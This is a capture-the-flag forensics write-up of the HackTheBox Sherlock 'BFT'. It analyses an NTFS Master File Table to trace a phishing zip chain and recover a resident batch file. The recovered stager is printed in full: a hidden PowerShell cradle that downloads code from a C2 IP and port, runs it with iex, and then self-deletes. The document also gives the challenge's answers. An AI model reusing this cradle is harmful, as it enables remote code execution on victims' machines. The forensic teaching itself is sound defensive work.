---
title: HTB Sherlock: BFT
url: https://0xdf.gitlab.io/2024/04/17/htb-sherlock-bft.html
date: 2024-04-17T10:00:00+00:00
difficulty: Very Easy
tags: ctf, dfir, forensics, sherlock-bft, sherlock-cat-dfir, hackthebox, htb-sherlock, mft, mftecmd, timeline-explorer, alternative-data-streams, zone-identifier, malware, bat, python
---

![bft](/icons/sherlock-bft.png)

BFT is all about analysis of a Master File Table (MFT). I’ll use Zimmerman tools MFTECmd and Timeline Explorer to find where a Zip archive was downloaded from Google Drive. It is then unzipped to get another zip, which is unzipped to get another zip. That final zip has a Windows Bat file in it. Because the Bat file is small, I’m able to recover the full file from the MFT and see that it uses a PowerShell cradle to download and run PowerShell from a malicious C2.

## Challenge Info

| Name | [BFT](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbft)  [BFT](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbft) [Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbft) |
| --- | --- |
| Release Date | 4 April 2024 |
| Retire Date | 4 April 2024 |
| Difficulty | Very Easy |
| Category | DFIR DFIR |
| Creator | [CyberJunkie CyberJunkie](https://app.hackthebox.com/users/468989) |

## Background

### Scenario

> In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity. During our analysis, you will utilize the MFTECmd tool to parse the provided MFT file, TimeLine Explorer to open and analyze the results from the parsed MFT, and a Hex editor to recover file contents from the MFT.

Notes from the scenario:
- I’ll be working with the master file table (MFT).
- They recommend TimeLine Explorer.
- I’ll need to work with a hex editor.

### Questions

To solve this challenge, I’ll need to answer the following 6 questions:
1. Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?
2. Examine the Zone Identifier contents for the initially downloaded ZIP file. This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of Compromise (IOC) in our investigation/analysis. What is the full Host URL from where this ZIP file was downloaded?
3. What is the full path and name of the malicious file that executed malicious code and connected to a C2 server?
4. Analyze the $Created0x30 timestamp for the previously identified file. When was this file created on disk?
5. Finding the hex offset of an MFT record is beneficial in many investigative scenarios. Find the hex offset of the stager file from Question 3.
6. Each MFT record is 1024 bytes in size. Files smaller than 1024 bytes are stored directly in the MFT file itself, known as MFT Resident files. During Windows filesystem investigations, it’s crucial to search for any malicious or suspicious files that may be resident in the MFT. This can reveal the contents of malicious files/scripts. Find the contents of the malicious stager identified in Question 3 and answer with the C2 IP and port.

### MFT

#### Background

A filesystem is a standard for how files are stored on disks. It describes where the file’s data starts and stops, or perhaps that it isn’t even stored contiguously on the disk. It also defines metadata about the files such as access controls and creation and modification timestamps.

NTFS stands for New Technology File System, which is no longer as accurate as it was at it’s first release in 1993. It is still the modern standard file system that Windows uses, and a key component of NTFS is the master file table. It acts as a database containing information about every file and directory on the NTFS volume (space on a disk formatted as NTFS). It records the files name, size, timestamps, and permissions, as well as the “data runs”, which are the phyical locations on the disk where the file’s contents are stored.

#### Raw File

The MFT is stored towards the start of the volume, in a reserved area not used by standard files. When handed a `$MFT` file for forensic analysis, a forensic tool has dumped that table to a file.

The raw file is a binary object that doesn’t make a lot of sense to a human eye:

```

oxdf@hacky$ xxd C/\$MFT | head -20
00000000: 4649 4c45 3000 0300 f042 cd4f 0000 0000  FILE0....B.O....
00000010: 0100 0100 3800 0100 a001 0000 0004 0000  ....8...........
00000020: 0000 0000 0000 0000 0700 0000 0000 0000  ................
00000030: 6201 0000 0000 0000 1000 0000 6000 0000  b...........`...
00000040: 0000 1800 0000 0000 4800 0000 1800 0000  ........H.......
00000050: 1a98 056a eab0 d901 1a98 056a eab0 d901  ...j.......j....
00000060: 1a98 056a eab0 d901 1a98 056a eab0 d901  ...j.......j....
00000070: 0600 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0001 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 3000 0000 6800 0000  ........0...h...
000000a0: 0000 1800 0000 0300 4a00 0000 1800 0100  ........J.......
000000b0: 0500 0000 0000 0500 1a98 056a eab0 d901  ...........j....
000000c0: 1a98 056a eab0 d901 1a98 056a eab0 d901  ...j.......j....
000000d0: 1a98 056a eab0 d901 0040 0000 0000 0000  ...j.....@......
000000e0: 0040 0000 0000 0000 0600 0000 0000 0000  .@..............
000000f0: 0403 2400 4d00 4600 5400 0000 0000 0000  ..$.M.F.T.......
00000100: 8000 0000 5000 0000 0100 4000 0000 0600  ....P.....@.....
00000110: 0000 0000 0000 0000 7f33 0100 0000 0000  .........3......
00000120: 4000 0000 0000 0000 0000 3813 0000 0000  @.........8.....
00000130: 0000 3813 0000 0000 0000 3813 0000 0000  ..8.......8.....

```

### Tools

There are many tools that will parse a raw MFT to a list of files with their metadata. The Sherlock prompt recommends Timeline Explorer, another tool from [Eric Zimmerman](https://ericzimmerman.github.io/#!index.md). It reads in Excel and CVS data and makes a searchable / sortable timeline.

I’ll use another Eric Zimmerman tool, `MFTECmd` to parse the data into a CSV file that can be loaded into Timeline Explorer.

I’ll also use HxD as a Windows hex editor that comes with Flare as well as Python for some file carving.

### Data

#### Overview

The download Zip archive has a single file, `$MFT` for a C drive:

```

oxdf@hacky$ unzip -l BFT.zip 
Archive:  BFT.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2024-03-20 12:52   C/
322437120  2023-07-07 03:48   C/$MFT
---------                     -------
322437120                     2 files

```

#### Process

To process these, I’ll use `MFTECmd`:

```

PS Z:\hackthebox-sherlocks\bft > MFTECmd.exe -f '.\C\$MFT' --csv . --csvf mft.csv
MFTECmd version 1.2.2.1

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/MFTECmd

Command line: -f .\C\$MFT --csv . --csvf mft.csv

Warning: Administrator privileges not found!

File type: Mft

Processed .\C\$MFT in 6.8863 seconds

.\C\$MFT: FILE records found: 171,927 (Free records: 142,905) File size: 307.5MB
        CSV output will be saved to .\mft.csv

```

I’m having it save the output as `mft.csv` in the current directory in CVS format. It reports finding 171,927 file records!

I’ll open Timeline Explorer, which is a GUI tool (rather than command line), and have it open `mft.csv`:

[![image-20240413144649558](/img/image-20240413144649558.png)*Click for full size image*](/img/image-20240413144649558.png)

There’s a ton of columns for each row!

## Malicious Zip

### Identify Initial Zip

#### Filter and Group

The first question asks about a Zip archive downloaded from a link sent in an email. In Timeline Explorer, I’ll find the “Extension” column and add a filter for “zip” by clicking on the row under the header and typing “zip” in there. There are five results:

[![image-20240414094927586](/img/image-20240414094927586.png)*Click for full size image*](/img/image-20240414094927586.png)

I can group these into three groups. The first one is in `Program Files`, named `Archive.zip`.

The next three (`Stage-20240213T093324Z-001.zip`, `invoice.zip`, and `invoices.zip`) I’m going to group together based “Parent Path”. This column shows the directory of the file. I’ll see that `invoice.zip` is in a Parent Path named to match `Stage-20240213T093324Z-001`. This is the result of unzipping that first zip. Similarly, `invoices.zip` is in an `invoice` directory, as if it was unzipped from `invoice.zip`.

The last group is `KAPE.zip`.

#### Timestamps

There are actually eight different timestamp-related columns in MFT data. There are 0x10 and 0x30 timestamps for Created, Last Modified, Last Record Change, and Last Access. I don’t need to get into the details of what each of these do here, as I only need a high level understanding to proceed with this challenge.

[![image-20240414095759841](/img/image-20240414095759841.png)*Click for full size image*](/img/image-20240414095759841.png)

`Archive.zip` was created back in July 2023, which is outside the scope given in the question.

`KAPE.zip` was downloaded on the same day in question, but it seems reasonable to say that invoice lures are *much* more common than fake forensic tools, so I’ll turn my attention to the 2nd group.

It’s a bit confusing to look at the Created timestamps here, as the `Stage-20240213T093324Z-001.zip` only has a Created0x10, but `invoice.zip` has a Created0x10 in 1980 (clearly not correct) but a Created0x30 that seems reasonable and `invoices.zip` has a Created0x10 50 minutes later than the Created0x30. Still, it seems likely that these three files were created in that order, which makes sense with the analysis of the parent directories above.

Putting those two together, it seems safe to say that the malicious download was `Stage-20240213T093324Z-001.zip` (Task 1).

### Zone Identifier

I’ll remove the “zip” extension filter and sort by “Last Modified0x10”. Then I’ll find the initial zip in the timeline and look at the files around it. The next file is very interesting:

[![image-20240414101035590](/img/image-20240414101035590.png)*Click for full size image*](/img/image-20240414101035590.png)

Windows (and NTFS specifically) has the concept of “alternative data streams” (ADS) for each file. In addition to the raw data of each file, it can have one or more ADS with other kinds of associated with the file. When Windows downloads a file from the internet, it attaches a `Zone.Identifier` stream to the file to label it as downloaded.

The MFT export includes the Zone Id data:

![image-20240414101420076](/img/image-20240414101420076.png)

This gives the `ZoneId` and the `HostUrl` for the file. The [Microsoft documentation on Security Zones](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537183(v=vs.85)?redirectedfrom=MSDN) is confusing, but `ZoneId` of 3 is the internet. And the `HostUrl` gives where it came from (Task 2).

### Unzipping

#### First Unzipping

Scrolling down, the unzipping seems to start at 16:35:15:

[![image-20240414103432366](/img/image-20240414103432366.png)*Click for full size image*](/img/image-20240414103432366.png)

Because I’m sorted by modification time, these are slightly out of order. The ones with red dots are created at 16:35:15, then the green dot at 16:35:26, and then the blue dots at 16:35:31.

, there’s a folder `Stage` created, then at 16:35:26 `invoice` is created, and then 16:35:31 `invoices.zip` and its Zone Identifier are created:

[![image-20240414102519717](/img/image-20240414102519717.png)*Click for full size image*](/img/image-20240414102519717.png)

They show up slightly out of order here because I’ve sorted on modified time, but the creation times line up. This seems likely to be the unzipping process over 16 seconds.

#### Second Unzipping

Just over three minutes later the last Zip is extracted. A neat trick is to filter on “invoice” in the Parent Path column:

[![image-20240414103933029](/img/image-20240414103933029.png)*Click for full size image*](/img/image-20240414103933029.png)

The `invoices` directory is created, and then `invoice.bat` and its Zone Identifier at 16:38:39 (Task 4). The Zone Identifier for both these files references their parent Zip:

![image-20240414104029198](/img/image-20240414104029198.png)

But more interestingly, there is now a `.bat` file, which will run commands on the Windows system if run, and is almost certainly malicious. While I can’t say for sure that it connected to a C2 server, it is a safe bet that it is the malicious file (Task 3).

## Recover Malicious bat

### Background

NFTS stores data about each file in a record that is 1024 bytes (1 kb) long. Files that are small enough (typically around 900 bytes) are stored in the MFT, using the extra space that’s already reserved and saving the trouble of having to go out to disk to get it.

### Identify Offset

Looking at the `invoice.bat` file, the size of the file is 286 bytes. That means that the file should be stored entirely in the MFT.

To get the offset in the MFT for the file in question, I’ll look at the “Entry Number” for that file:

[![image-20240414161828259](/img/image-20240414161828259.png)*Click for full size image*](/img/image-20240414161828259.png)

Each entry is 1024 bytes, so that offset to this file is 23436 \* 1024 = 23998464 = 0x16E3000 (Task 5).

### Get File Contents

I’ll open the `$MFT` file in HxD (a nice Windows Hex editor) and go (Ctrl-G) to the offset 0x16E3000:

[![image-20240414162600092](/img/image-20240414162600092.png)*Click for full size image*](/img/image-20240414162600092.png)

The filename and raw data are immediately visible. The other metadata includes all the timestamps and permissions data, but in a binary format that’s not human readable.

I’ll copy out the `.bat` file text:

```

@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGFW9uIGV0dw==') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"

```

This script is starting by turning off echo, to not print commands run to the screen. Then it runs a PowerShell cradle that will issues a request to `http://43.204.110.203:6666` and download a file, passing what comes back to `iex` (short for `Invoke-Expression`). The C2 IP and port are 43.204.110.203:6666 (Task 6).

### Binary Files

It turns out that many of the files in question here are smaller than 900 bytes. For example, `invoice.zip` is 433 bytes. I can get the offset the same way:

[![image-20240414163303841](/img/image-20240414163303841.png)*Click for full size image*](/img/image-20240414163303841.png)

88576 \* 1024 = 90701824 = 0x5680000. Zip files start with “PK”, which I’ll find at offset 0x5680128:

[![image-20240414163459706](/img/image-20240414163459706.png)*Click for full size image*](/img/image-20240414163459706.png)

It isn’t easy to copy and paste the raw bytes out of here, but I’ll turn to Python. I’ll open a terminal and read in the file:

```

oxdf@hacky$ python
Python 3.11.7 (main, Dec  8 2023, 18:56:58) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> with open('C/$MFT', 'rb') as f:
...     mft = f.read()
... 
>>> len(mft)
322437120

```

Then I just need to read bytes at that offset:

```

>>> start = 0x5680128
>>> mft[start]
80
>>> chr(mft[start])
'P'
>>> chr(mft[start+1])
'K'

```

I’ll write the file out to a file:

```

>>> with open('invoice.zip', 'wb') as fout:
...     fout.write(mft[start:start+433])
... 
433

```

I’ve successfully recovered the entire malicious Zip from the MFT:

```

oxdf@hacky$ file invoice.zip 
invoice.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
oxdf@hacky$ unzip -l invoice.zip 
Archive:  invoice.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      286  2024-02-13 04:23   invoice.bat
---------                     -------
      286                     1 file

```

`Stage-20240213T093324Z-001.zip` is 930 bytes, and isn’t found in the MFT (it’s too big).

## Results

### Timeline

Putting all that together makes the following timeline:

| Time (UTC) | Description | Reference |
| --- | --- | --- |
| 16:34:40 | Malicious Zip downloaded | `$MFT` |
| 16:35:15 | Initial Zip begin unzipping | `$MFT` |
| 16:38:39 | `invoice.bat` unzipped | `$MFT` |

### Question Answers
1. Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?

   `Stage-20240213T093324Z-001.zip`
2. Examine the Zone Identifier contents for the initially downloaded ZIP file. This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of Compromise (IOC) in our investigation/analysis. What is the full Host URL from where this ZIP file was downloaded?

   `https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser`
3. What is the full path and name of the malicious file that executed malicious code and connected to a C2 server?

   `C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat`
4. Analyze the $Created0x30 timestamp for the previously identified file. When was this file created on disk?

   2024-02-13 16:38:39
5. Finding the hex offset of an MFT record is beneficial in many investigative scenarios. Find the hex offset of the stager file from Question 3.

   16E3000
6. Each MFT record is 1024 bytes in size. Files smaller than 1024 bytes are stored directly in the MFT file itself, known as MFT Resident files. During Windows filesystem investigations, it’s crucial to search for any malicious or suspicious files that may be resident in the MFT. This can reveal the contents of malicious files/scripts. Find the contents of the malicious stager identified in Question 3 and answer with the C2 IP and port.
   43.204.110.203:6666